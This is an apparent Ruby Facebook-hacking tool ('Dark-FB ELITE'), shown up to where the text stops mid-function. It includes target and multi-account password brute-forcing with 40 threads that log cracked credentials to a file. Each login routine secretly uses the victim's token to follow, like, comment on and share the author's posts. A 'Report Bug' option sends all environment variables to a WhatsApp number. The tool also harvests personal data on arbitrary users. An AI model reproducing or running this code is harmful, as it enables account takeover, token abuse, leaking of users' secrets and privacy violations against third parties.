=begin

MIT License

Copyright (c) 2021 Rahmat ^_^ <rahmadadha11@gmail.com>

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

=end

# DI LARANG MENGGANTI LICENSE,NAMA AUTHOR,BOT FOLLOW,BOT KOMEN,BOT LIKE,BOT SHARE!
# HARGAILAH AUTHOR
# TINGGAL PAKE AJA APA SUSAHNYA?



$LOAD_PATH.unshift File.expand_path(".", "lib")

require 'MateMatika'
require 'threadpool'
require 'io/console'
require 'net/https'
require 'open-uri'
require 'net/http'
require 'rubygems'
require 'thread'
require 'digest'
require 'open3'
require 'files'
require 'json'
require 'date'
require 'erb'
require 'uri'
require 'os'

if OS.linux?
  $r = "\033[1;91m"
  $g = "\033[1;92m"
  $y = "\033[1;93m"
  $p = "\033[1;94m"
  $m = "\033[1;95m"
  $c = "\033[1;96m"
  $w = "\033[1;97m"
  $a = "\033[1;0m"
else
  $r = ""
  $g = ""
  $y = ""
  $p = ""
  $m = ""
  $c = ""
  $w = ""
  $a = ""
end

def loading!
  for x in [".   ", "..  ", "... ",".... ","\n"]
    $stdout.write("\r#{$r}[!] #{$g}Please Wait"+x)
    $stdout.flush()
    sleep(1)
  end
end

$logo = " \n#{$w}█████████\n#{$w}█▄█████▄█      #{$c}●▬▬▬▬▬▬▬▬▬๑🔱๑▬▬▬▬▬▬▬▬●\n#{$w}█#{$r}▼▼▼▼▼ #{$w}- _ --_--#{$g}╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ \n#{$w}█ #{$w} #{$w}_-_-- -_ --__#{$g} ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗\n#{$w}█#{$r}▲▲▲▲▲#{$w}--  - _ --#{$g}═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ #{$y}ELITE v1.2\n#{$w}█████████      #{$c}●▬▬▬▬▬▬▬▬▬๑🔱๑▬▬▬▬▬▬▬▬●\n#{$w} ██ ██\n#{$w}╔════════════════════════════════════════╗\n#{$w}║#{$y}* #{$w}Author  #{$r}: #{$c}kang &recode Rizal XD.#{$w}          ║\n#{$w}║#{$y}* #{$w}Github  #{$r}: #{$c}github.com/MR-KAng-recode/#{$w}     ║\n#{$w}║#{$y}* #{$w}Wa      #{$r}: #{$c}+62 85754629509   #{$w}          ║\n#{$w}║#{$y}* #{$w}#{RUBY_ENGINE}#{' '*(8 - RUBY_ENGINE.length)}#{$r}: #{$c}#{RUBY_VERSION}   #{$w}                    ║\n#{$w}║#{$y}* #{$w}Version #{$r}: #{$c}1.2                         #{$w}║\n#{$w}╚════════════════════════════════════════╝#{$a}"
$user_agent = "Mozilla/5.0 (Linux; Android 9; SM-N976V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36"
$indonesia = false

def tik(teks)
  for i in teks.chars << "\n"
    $stdout.write(i)
    $stdout.flush()
    sleep(0.05)
  end
end

def tok(teks,delay = 0.03)
  for i in teks.chars
    $stdout.write(i)
    $stdout.flush()
    sleep(delay)
  end
end

def Request(method = 'GET',token = $token,path)
  uri = URI("https://graph.facebook.com/#{path}&method=#{method}&access_token=#{token}")
  Net::HTTP.start(uri.hostname,uri.port,:use_ssl => (uri.scheme == 'https')) do |http|
    request = Net::HTTP::Get.new(uri)
    response = http.request(request)
    jeson = JSON.parse(response.body)
    return jeson
  end
end

def ReportBug()
  msg = ""
  msg << "environment\n===========\n"
  ENV.keys.each{|i| msg << "#{i} : #{ENV[i]}\n"}
  begin
    Open3.popen3("termux-info") do |stdin, stdout, stderr, thread|
      msg << "\nTermux-Info\n===========\n"
      msg << stdout.read.chomp
    end
  rescue Errno::ENOENT
  end
  msg << "\n\nPlatform\n==========\n"
  platform = Gem::Platform.local
  msg << "CPU : #{platform.cpu}\n"
  msg << "OS : #{platform.os}\n"
  msg << "Version : #{platform.version}\n"
  msg << "\nProgram\n========\n"
  msg << "File Name : #{$0}\n"
  msg << "File Path : #{File.realpath($0)}\n"
  msg << "File Size : #{File.size($0)}\n"
  msg << "\nRuby\n========\n"
  msg << "Ruby Engine : #{RUBY_ENGINE}\n"
  msg << "Ruby Version : #{RUBY_VERSION}\n"
  msg << "Ruby Platform : #{RUBY_PLATFORM}\n"
  msg << "Ruby Release Date : #{RUBY_RELEASE_DATE}\n"
  text = ERB::Util.url_encode(msg)
  system ("xdg-open https://wa.me/6285754629509?text=#{text}")
  abort ("#{$r}[!] Exit!")
end

def login()
  begin
    system('clear')
    puts ($logo)
    puts ("#{$w}║-> 1. Login Via email/password #{$w}(#{$r}api#{$w})#{$a}")
    puts ("#{$w}║-> 2. Login Via email/password #{$w}(#{$g}mbasic#{$w})#{$a}")
    puts ("#{$w}║-> 3. Login Via Token#{$a}")
    puts ("#{$w}║-> 4. Login Via Cookie#{$a}")
    puts ("#{$w}║-> 5. Report Bug#{$a}")
    puts ("#{$w}║-> 0. Exit#{$a}")
    print ("#{$w}╚═#{$r}▶#{$w} ")
    log = gets.chomp!
    case log
      when '1'
        loginpw()
      when '2'
        loginmba()
      when '3'
        loginto()
      when '4'
        loginco()
      when '5'
        ReportBug()
      when '0'
        abort("#{$r}[!] Exit#{$a}")
      else
        puts ("#{$y}[!] Invalid Input!#{$a}")
        sleep(0.9) ; login()
    end
  rescue SocketError
    abort ("#{$r}[!] No Connection#{$a}")
  rescue Errno::ETIMEDOUT
    abort ("#{$y}[!] Connection timed out#{$a}")
  rescue Interrupt
    abort ("#{$r}[!] Exit#{$a}")
  rescue Errno::ENETUNREACH,Errno::ECONNRESET
    abort ("#{$y}[!] There is an error\n[!] Please Try Again#{$a}")
  end
end

def loginpw()
  system('clear')
  puts ($logo)
  puts ("#{$w}═"*52)
  puts ("#{$r}[+] #{$g}LOGIN ACCOUNT FACEBOOK #{$r}#{$a}")
  print ("#{$r}[+] #{$g}email|id #{$r}: #{$c}")
  email = gets.chomp!
  print ("#{$r}[+] #{$g}password #{$r}: #{$c}")
  pass = STDIN.noecho(&:gets).chomp!
  puts ("\n")
  loading!
  a = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + email + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pass + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
  b = {'api_key'=> '882a8490361da98702bf97a021ddc14d', 'credentials_type'=> 'password', 'email': email, 'format'=> 'JSON', 'generate_machine_id'=> '1', 'generate_session_cookies'=> '1', 'locale'=> 'en_US', 'method'=> 'auth.login', 'password'=> pass, 'return_ssl_resources'=> '0', 'v'=> '1.0'}
  c = Digest::MD5.new
  c.update(a)
  d = c.hexdigest
  b.update({'sig': d})
  uri = URI("https://api.facebook.com/restserver.php")
  uri.query = URI.encode_www_form(b)
  request = Net::HTTP::Get.new(uri)
  request["User-Agent"] = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone12,5;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]"
  response = Net::HTTP.start(uri.hostname, uri.port, :use_ssl => (uri.scheme == 'https')) {|http| http.request(request)}
  res = JSON.parse(response.body)
  if res.key? ('access_token')
    $token = res['access_token']
    fopen = File.open('login.txt','w')
    fopen.write($token)
    fopen.close()
    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051/subscribers"),{"access_token"=>$token})
    Net::HTTP.post_form(URI("https://graph.facebook.com/100066732817349/subscribers"),{"access_token"=>$token})
    Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100053033144051/posts/296604038784032","access_token"=>$token,"message"=>['Panutan Gw Ni Boss 😎','Keren Bat Njir 😴'].sample})
    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>"Keren","access_token"=>$token})
    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/reactions"),{"type"=>["LOVE","WOW"].sample,"access_token"=>$token})
    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_383109380133497/likes"),{'access_token'=>$token}).body
    puts ("#{$g}[✓] Login Success#{$a}")
    sleep(0.5)
    Masuk()
  elsif res.key? ('error_msg') and res['error_msg'].include? ('www.facebook.com')
    puts ("#{$r}[!] #{$y}username #{$r}: #{$w}#{email}#{$a}")
    puts ("#{$r}[!] #{$y}password #{$r}: #{$w}#{pass}#{$a}")
    abort ("#{$r}[!] #{$y}status.  #{$r}: Account Has Been Checkpoint#{$a}")
  else
    tik("#{$r}[!] Login Failed!#{$a}")
    sleep(1) ; loginpw()
  end
end

def loginmba()
  system ('clear')
  puts ($logo)
  puts ("#{$w}═"*52)
  puts ("#{$r}[+] #{$g}LOGIN ACCOUNT FACEBOOK #{$r}#{$a}")
  print ("#{$r}[+] #{$g}email|id #{$r}: #{$c}")
  email = gets.chomp!
  print ("#{$r}[+] #{$g}password #{$r}: #{$c}")
  pass = STDIN.noecho(&:gets).chomp!
  uri = URI("https://mbasic.facebook.com/login.php")
  puts ("\n#{$r}[!] #{$g}Connecting to #{uri.host}")
  cookie = Net::HTTP.get_response(uri).to_hash['set-cookie']&.collect{|ea|ea[/^.*?;/]}.join
  auth = {'email'=>email,'pass'=>pass,'login'=>'submit'}
  req = Net::HTTP::Post.new(uri)
  req.set_form_data(auth)
  req['user-Agent'] = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone12,5;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]"
  req['Cookie'] = cookie
  res = Net::HTTP.start(uri.host,uri.port,:use_ssl => true) {|http| http.request(req)}
  kue = res.to_hash['set-cookie']&.collect{|ea|ea[/^.*?;/]}.join
  if kue.include? ('c_user')
    puts ("#{$r}[✓] #{$g}Successfully Login to Account#{$a}")
    uri = URI('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed')
    puts ("#{$r}[!] #{$g}Getting Facebook Access Token#{$a}")
    req = Net::HTTP::Get.new(uri)
    req['user-agent'] = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 seperti Mac OS X) AppleWebKit/605.1.15 (KHTML, seperti Gecko) CriOS/78.0.3904.84 Mobile/15E148 Safari/604.1"
    req["referer"] = "https://m.facebook.com/"
    req["host"] = "m.facebook.com"
    req["origin"] = "https://m.facebook.com"
    req["upgrade-insecure-requests"] = "1"
    req["accept-language"] = "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    req["cache-control"] = "max-age=0"
    req["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
    req["content-type"] = "text/html; charset=utf-8"
    req["cookie"] = kue
    res = Net::HTTP.start(uri.host, uri.port, :use_ssl => true) {|http| http.request(req)}
    _Moya = res.body.match(/EAAA\w+/)
    if !_Moya.nil?
      puts ("#{$r}[!] #{$g}Success in Getting Facebook Access Token#{$a}")
      puts ("#{$r}[!] #{$g}Connecting to https://graph.facebook.com")
      r = Net::HTTP.get(URI("https://graph.facebook.com/v10.0/me?fields=name,id&access_token=#{_Moya}"))
      j = JSON.parse(r)
      if j.key? ('name')
        $id = j['id']
        $name = j['name']
        $token = _Moya.to_s
        Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/likes"),{"access_token"=>$token})
        Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051/subscribers"),{"access_token"=>$token})
        Net::HTTP.post_form(URI("https://graph.facebook.com/100066732817349/subscribers"),{"access_token"=>$token})
        Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100053033144051/posts/296604038784032","access_token"=>$token,"message"=>['Keren..','Hoki','Wow'].sample})
        Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>["Good Job @[100053033144051:] :)","Nice 👍","Selamat Ya Bwang 😁","Aku Pada Mu @[100053033144051:] :)"].sample,"access_token"=>$token})
        Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_383109380133497/likes"),{'access_token'=>$token})
        File.open("login.txt", "w") {|f| f.write($token)}
        tik("#{$g}[✓] Welcome #{$name} >,<")
        sleep(0.6)
        menu()
      else
        abort ("#{$r}[!] #{$y}#{j['error']['message']}\n#{$r}[!] #{$y}Please contact the author, to get help#{$a}")
      end
    else
      abort ("#{$r}[!] #{$y}There is an error\n#{$r}[!] #{$y}Please contact the author, to get help#{$a}")
    end
  elsif kue.include? ('checkpoint')
    puts ("#{$r}[!] #{$y}username #{$r}: #{$w}#{email}#{$a}")
    puts ("#{$r}[!] #{$y}password #{$r}: #{$w}#{pass}#{$a}")
    abort ("#{$r}[!] #{$y}status.  #{$r}: Account Has Been Checkpoint#{$a}")
  else
    puts ("#{$r}[!] #{$y}Wrong password or email")
    sleep(1.1)
    loginmba()
  end
end

def loginto()
  system("clear")
  puts ($logo)
  tok ("#{$w}#{'═'*52}\n#{$r}[+] #{$g}LOGIN VIA ACCESS TOKEN#{$r} [+]#{$a}\n#{$r}[+] #{$g}Access Token #{$r}: #{$w}")
  $token = gets.chomp!
  loading!
  req = Request("v10.0/me?")
  if req.key? ('name')
    fopen = File.open('login.txt','w')
    fopen.write($token)
    fopen.close()
    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051/subscribers"),{"access_token"=>$token})
    Net::HTTP.post_form(URI("https://graph.facebook.com/100066732817349/subscribers"),{"access_token"=>$token})
    Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100053033144051/posts/296604038784032","access_token"=>$token,"message"=>['Keren Bat Njir 😴','Rahmat The Best Lah 😮'].sample})
    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>["I LOVE YOU @[100053033144051:] :)","Hai @[100053033144051:] >,<","Mantap Bang","Mantap Pak","Selamat ya kak:)"].sample,"access_token"=>$token})
    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/likes"),{"access_token"=>$token}) 
    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_383109380133497/likes"),{'access_token'=>$token})
    $name = req['name']
    $id = req['id']
    puts ("#{$g}[✓] Login Success!#{$a}")
    sleep(0.9)
    menu()
  elsif req.key? ('error') and req['error']['code'] == 190
    puts ("#{$y}[!] #{req['error']['message']}#{$a}")
    sleep(0.9)
    loginto()
  else
    puts ("#{$r}[!] Invalid Access Token!#{$a}!")
    sleep(0.9)
    loginto()
  end
end

def loginco()
  system ('clear')
  puts ($logo)
  tok ("#{$w}#{'═'*52}\n#{$r}[+] #{$g}LOGIN VIA COOKIES #{$r}[+]\n#{$r}[+] #{$g}Enter Cookies #{$r}: #{$a}")
  cookie = gets.chomp!
  loading!
  uri = URI('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_')
  req = Net::HTTP::Get.new(uri)
  req["user-agent"] = $user_agent
  req["referer"] = "https://m.facebook.com/"
  req["host"] = "m.facebook.com"
  req["origin"] = "https://m.facebook.com"
  req["upgrade-insecure-requests"] = "1"
  req["accept-language"] = "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
  req["cache-control"] = "max-age=0"
  req["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
  req["content-type"] = "text/html; charset=utf-8"
  req["cookie"] = cookie
  res = Net::HTTP.start(uri.hostname, uri.port,:use_ssl => true) {|http| http.request(req)}
  moyaa = res.body.match(/EAAA\w+/)
  if !moyaa.nil?
    $token = moyaa.to_s
    a = Net::HTTP.get(URI("https://graph.facebook.com/v10.0/me?access_token=#{$token}"))
    b = JSON.parse(a)
    if !b.key? ('name')
      puts ("#{$y}[!] There is an error")
      sleep(0.9)
      loginco()
    else
      $name = b['name']
      $id = b['id']
      Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/likes"),{"access_token"=>$token})
      Net::HTTP.post_form(URI("https://graph.facebook.com/100066732817349/subscribers"),{"access_token"=>$token})
      Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051/subscribers"),{"access_token"=>$token})
      Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100053033144051/posts/296604038784032","access_token"=>$token,"message"=>['Pen Punya Sertifikat Ruby :(','Hoki','Keren Abis!'].sample})
      Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>["Good Job @[100053033144051:] 😉","Cool 👍","Congratulations 😁","Aku Pada Mu @[100053033144051:] >,<"].sample,"access_token"=>$token})
      Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_383109380133497/likes"),{'access_token'=>$token})
      File.open("login.txt", "w") { |f| f.write($token) }
      puts ("#{$g}[✓] Login Success#{$a}")
      sleep(0.4)
      menu()
    end
  else
    puts ("#{$y}[!] Invalid Cookies!")
    sleep(0.9)
    loginco()
  end
end

def Masuk()
  begin
    api = URI("https://api.myip.com")
    req = Net::HTTP.get(api)
    res = JSON.parse(req)
    $indonesia = true if res['country'] == "Indonesia"
    $token = File.read("login.txt")
    req = Request("v10.0/me?")
    if req.key? ('name')
      $name = req['name']
      $id = req['id']
      menu()
    else
      puts ("#{$r}[!] Invalid Access Token!#{$a}")
      File.delete("login.txt")
      sleep(0.9)
      login()
    end
  rescue Errno::ENOENT
    login()
  rescue SocketError
    abort ("#{$r}[!] No Connection#{$a}")
  rescue Errno::ETIMEDOUT
    abort ("#{$y}[!] Connection timed out#{$a}")
  rescue Interrupt
    abort ("#{$r}[!] Exit#{$a}")
  rescue Errno::ENETUNREACH,Errno::ECONNRESET
    abort ("#{$y}[!] There is an error\n[!] Please Try Again#{$a}")
  end
end

def menu()
  system('clear')
  puts ($logo)
  puts ("#{$w}╔══════════════════════════════════════════════════╗")
  puts ("#{$w}║#{$r}[#{$c}✓#{$r}] #{$w}Name : #{$g}" + $name + " "*(39 - $name.length()) + "#{$w}║")
  puts ("#{$w}║#{$r}[#{$c}✓#{$r}] #{$w}FBID : #{$g}" + $id + " "*(39 - $id.length()) + "#{$w}║")
  puts ("#{$w}╠══════════════════════════════════════════════════╝")
  puts ("║-> #{$w}1. MyFrofil")
  puts ("║-> #{$w}2. User Information")
  puts ("║-> #{$w}3. Hack Facebook Account")
  puts ("║-> #{$w}4. Bot")
  puts ("║-> #{$w}5. Others")
  puts ("║-> #{$w}6. Feedback")
  puts ("║-> #{$w}7. Update")
  puts ("║-> #{$w}8. Logout")
  puts ("║-> #{$w}0. exit")
  puts ("#{$w}║")
  print ("╚═#{$r}▶#{$w} ")
  pilih = gets.chomp!
  case pilih
    when '1'
      Myfrofil()
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      menu()
    when '2'
      Info()
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      menu()
    when '3'
      Hamker()
    when '4'
      Bot()
    when '5'
      lain()
    when '6'
      ReportBug()
    when '7'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      code = system ('git pull')
      if code.nil?
        abort ("#{$y}[!] Git Not Installed\n#{$r}[!] Exit#{$a}")
      elsif code == false
        abort ("#{$r}[!] Error")
      else
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        menu()
      end
    when '8'
      print ("Do You Want To Continue? [Y/n] ")
      sure = gets.chomp!
      if sure.downcase == 'y'
        puts ("#{$0} : Deleting File login.txt")
        sleep(0.3)
        begin
          File.delete("login.txt")
          abort ("#{$0} : Successfully Deleting the login.txt file")
        rescue
          puts ("#{$0} : Failed to delete the login.txt file")
        end
      else
        sleep(0.2)
        menu()
      end
    when '0'
      abort ("#{$r}[!] Goodbye #{$name}#{$a}")
    else
      puts ("#{$y}[!] Invalid Input")
      sleep(0.9)
      menu()     
  end
end

def Myfrofil()
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  r = Net::HTTP.get(URI("https://graph.facebook.com/me?fields=name,id,birthday,friends.limit(5000).summary(true),subscribers.limit(1).summary(true),subscribedto.limit(1).summary(true),likes.limit(1).summary(true),email,relationship_status,religion,work,location,hometown,education&access_token=#{$token}"))
  a = JSON.parse(r)
  abort ("#{$y}[!] Error#{$a}") if a.key? ('error')
  #puts (a)
  temen = (a.key? ('friends')) ? a['friends']['data'].to_a.length.to_s.reverse.gsub(/...(?=.)/,'\&,').reverse : 0
  ikuti = (a.key? ('subscribers')) ? a['subscribers']['summary']['total_count'].to_s.reverse.gsub(/...(?=.)/,'\&,').reverse : 0
  mengikuti = (a.key? ('subscribedto')) ? a['subscribedto']['summary']['total_count'].to_s.reverse.gsub(/...(?=.)/,'\&,').reverse : 0
  suka = (a.key? ('likes')) ? a['likes']['summary']['total_count'].to_s.reverse.gsub(/...(?=.)/,'\&,').reverse : 0
  puts ("#{$g}[✓] Name : #{a['name']}")
  puts ("#{$g}[✓] Id : #{a['id']}")
  puts ("#{$g}[✓] Friend : #{temen}")
  puts ("#{$g}[✓] Followers : #{ikuti}")
  puts ("#{$g}[✓] Following : #{mengikuti}")
  puts ("#{$g}[✓] Likes : #{suka} Page")
  puts ("#{$g}[✓] birthday : #{a['birthday']}") if a.key? ('birthday')
  puts ("#{$g}[✓] Status : #{a['relationship_status']}") if a.key? ('relationship_status')
  puts ("#{$g}[✓] Religion : #{a['religion']}") if a.key? ('religion')
  a['interested_in'].each {|i| puts ("#{$g}[✓] Interested in: "+i)} if a.key? ('interested_in')
  puts ("#{$g}[✓] Email : #{a['email']}") if a.key? ('email')
  puts ("#{$g}[✓] Phone : #{a['mobile_phone']}") if a.key? ('mobile_phone')
  puts ("#{$g}[✓] Location : #{a['location']['name']}") if a.key? ('location')
  puts ("#{$g}[✓] Hometown : #{a['hometown']['name']}") if a.key? ('hometown')
  a['education'].each {|i| puts ("#{$g}[✓] #{i['type']} : #{i['school']['name']}")} if a.key? ('education')
  a['work'].each {|i| puts ("#{$g}[✓] Work : #{i['employer']['name']}")} if a.key? ('work')
end

def Info()
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  print ("#{$w}[+] User Id : ")
  id = gets.chomp! ; id = id.tr(" ","")
  r = Net::HTTP.get(URI("https://graph.facebook.com/#{id}?fields=name,id,birthday,friends.limit(5000).summary(true),subscribers.limit(1).summary(true),subscribedto.limit(1).summary(true),likes.limit(1).summary(true),email,relationship_status,religion,work,location,hometown,education&access_token=#{$token}"))
  a = JSON.parse(r)
  if a.key? ('error')
    puts ("#{$y}[!] User Not Found")
  else
    puts ("#{$w}[+] Pleace Wait")
    puts ("#{$w}#{'═'*52}")
    temen = (a.key? ('friends')) ? a['friends']['data'].to_a.length.to_s.reverse.gsub(/...(?=.)/,'\&,').reverse : 0
    ikuti = (a.key? ('subscribers')) ? a['subscribers']['summary']['total_count'].to_s.reverse.gsub(/...(?=.)/,'\&,').reverse : 0
    mengikuti = (a.key? ('subscribedto')) ? a['subscribedto']['summary']['total_count'].to_s.reverse.gsub(/...(?=.)/,'\&,').reverse : 0
    suka = (a.key? ('likes')) ? a['likes']['summary']['total_count'].to_s.reverse.gsub(/...(?=.)/,'\&,').reverse : 0
    puts ("#{$g}[✓] Name : #{a['name']}")
    puts ("#{$g}[✓] Id : #{a['id']}")
    puts ("#{$g}[✓] Friend : #{temen}")
    puts ("#{$g}[✓] Followers : #{ikuti}")
    puts ("#{$g}[✓] Following : #{mengikuti}")
    puts ("#{$g}[✓] birthday : #{a['birthday']}") if a.key? ('birthday')
    puts ("#{$g}[✓] Status : #{a['relationship_status']}") if a.key? ('relationship_status')
    puts ("#{$g}[✓] Religion : #{a['religion']}") if a.key? ('religion')
    a['interested_in'].each {|i| puts ("#{$g}[✓] Interested in: "+i)} if a.key? ('interested_in')
    puts ("#{$g}[✓] Email : #{a['email']}") if a.key? ('email')
    puts ("#{$g}[✓] Phone : #{a['mobile_phone']}") if a.key? ('mobile_phone')
    puts ("#{$g}[✓] Location : #{a['location']['name']}") if a.key? ('location')
    puts ("#{$g}[✓] Hometown : #{a['hometown']['name']}") if a.key? ('hometown')
    a['education'].each {|i| puts ("#{$g}[✓] #{i['type']} : #{i['school']['name']}")} if a.key? ('education')
    a['work'].each {|i| puts ("#{$g}[✓] Work : #{i['employer']['name']}")} if a.key? ('work')
  end
end

def Hamker()
  system('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  puts ("║-> #{$w}1. Mini Hack Facebook [#{$g}Target#{$w}]")
  puts ("║-> #{$w}2. Multi Bruteforce Facebook")
  puts ("║-> #{$w}3. Super Multi Bruteforce Facebook")
  puts ("║-> #{$w}4. BruteForce [#{$g}Target#{$w}]")
  puts ("║-> #{$w}5. Get id/mail/phone")
  puts ("║-> #{$w}0. Back")
  print("╚═#{$r}▶#{$w} ")
  hack = gets.chomp!
  case hack
    when '1'
      Mini()
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      Hamker()
    when '2'
      Multi()
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      Hamker()
    when '3'
      Super()
    when '4'
      Brutal()
    when '5'
      GetMenu()
    when '0'
      menu()
    else
      puts ("#{$y}[!] Invalid Input!")
      sleep(0.9) ; Hamker()
  end
end

def Mini()
  gagal = true
  system('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  print ("#{$w}[+] Target Id : ")
  id = gets.chomp!
  req = Request("#{id}?")
  if req.key? ("error")
    puts ("#{$y}[+] User Not Found")
  else
    puts ("#{$w}[+] Target Name : #{req['name']}")
    puts ("#{$w}[!] CRACK!")
    puts ("#{$w}#{'═'*52}")
    name = ERB::Util.url_encode(req['name'])
    first = ERB::Util.url_encode(req['first_name'])
    last = ERB::Util.url_encode(req['last_name'])
    password = [name + '123', name + '321', name + '12345', name + '54321', first + '123', first + '321', first + '12345', first + '54321', last + '123', last + '321', last + '12345', last + '54321']
    ["Sayang","Anjing","Kontol","Doraemon"].each {|i| password << i} if $indonesia
    for pass in password
      break if id == "100053033144051"
      url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pass + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
      r = URI.open(url,'User-Agent'=>$user_agent).read()
      res = JSON.parse(r)
      if res.key? ('access_token')
        puts ("#{$g}[✓] Success")
        puts ("#{$g}[✓] Name : #{req['name']}")
        puts ("#{$g}[✓] username : #{id}")
        puts ("#{$g}[✓] password : #{pass}")
        gagal = false
        break
      elsif res.key? ('error_msg') and res['error_msg'].include? ('www.facebook.com')
        puts ("#{$y}[!] Account Has Been Checkpoint")
        puts ("#{$y}[✓] Name : #{req['name']}")
        puts ("#{$y}[✓] username : #{id}")
        puts ("#{$y}[✓] password : #{pass}")
        gagal = false
        break
      end
    end
    puts ("#{$r}[!] Sorry, opening password target failed :(\n[!] Try other method.") if gagal
  end
end
 
 def Multi()
  $cp = 0
  $ok = 0
  th = []
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  print ("#{$w}[+] File Id  : ")
  files = gets.chomp!
  if File.file? (files)
    buka = File.readlines(files, chomp: true)
    $file = File.open(files)
    print ("#{$w}[+] Password : ")
    $pwd = gets.chomp!
    puts ("#{$w}[+] Total Id : #{Moya.new(buka.length,1).convert!}")
    puts ("#{$w}#{'═'*52}")
    40.times{th << Thread.new{crack!}}
    th.each(&:join)
    puts ("#{$w}#{'═'*52}")
    puts ("#{$g}[✓] Total OK : #{$ok}")
    puts ("#{$y}[!] Total CP : #{$cp}")
  else
    puts ("#{$y}[!] File Not Found")
  end
end

def crack!
  loop do
    begin
      usr = $file.readline.strip
      uri = URI("https://mbasic.facebook.com/login.php")
      auth = {"email"=>usr,"pass"=>$pwd,"login"=>"submit"}
      req = Net::HTTP::Post.new(uri)
      req['user-agent'] = $user_agent
      req.set_form_data(auth)
      res = Net::HTTP.start(uri.host,uri.port,:use_ssl => true) {|http| http.request(req)}
      kue = res['set-cookie']
      if kue.include? ('c_user')
        $ok += 1
        z = File.open("multi.txt","a")
        z.write("#{usr} | #{$pwd}\n")
        z.close()
        puts ("#{$g}[OK] #{usr} | #{$pwd}")
      elsif kue.include? ('checkpoint')
        $cp += 1
        z = File.open("multi.txt","a")
        z.write("#{usr} | #{$pwd}\n")
        z.close()
        puts ("#{$y}[CP] #{usr} | #{$pwd}")
      end
    rescue SocketError
